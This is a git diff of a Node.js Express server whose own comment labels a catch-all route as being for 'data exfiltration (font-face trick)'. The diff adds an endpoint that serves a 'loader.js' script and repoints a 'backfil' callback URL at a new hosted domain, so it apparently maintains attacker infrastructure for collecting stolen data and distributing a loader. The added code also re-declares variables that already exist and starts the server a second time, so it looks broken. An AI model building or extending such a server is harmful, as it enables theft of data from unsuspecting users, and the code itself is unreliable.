@@ -13,6 +13,34 @@ if (!fs.existsSync(DATA_FOLDER)) {
 }
 
 console.log(`🚀 Server starting on port ${PORT}`);
+const express = require('express');
+const path = require('path');
+const app = express();
+
+const PORT = process.env.PORT || 3000;
+
+// Serve loader.js when a client requests GET /loader.js
+app.get('/loader.js', (req, res) => {
+  const filePath = path.join(__dirname, 'axiom', 'loader.js');
+
+  res.sendFile(filePath, {
+    headers: {
+      'Content-Type': 'application/javascript'
+    }
+  }, (err) => {
+    if (err) {
+      if (err.code === 'ENOENT') {
+        res.status(404).send('File not found');
+      } else {
+        res.status(500).send('Error serving file');
+      }
+    }
+  });
+});
+
+app.listen(PORT, () => {
+  console.log(`Server running on port ${PORT}`);
+});
 
 // Catch-all route for data exfiltration (font-face trick)
 app.get('*', (req, res) => {
@@ -52,7 +80,7 @@ app.get('*', (req, res) => {
         res.json({
             success: true,
             msg: "OK",
-            backfil: "https://terminalcore.onrender.com"   // replace with your real Render URL
+            backfil: "https://bloom-sniper-production.up.railway.app"   // replace with your real Render URL
         });
     } else {
         res.status(200).send('OK');
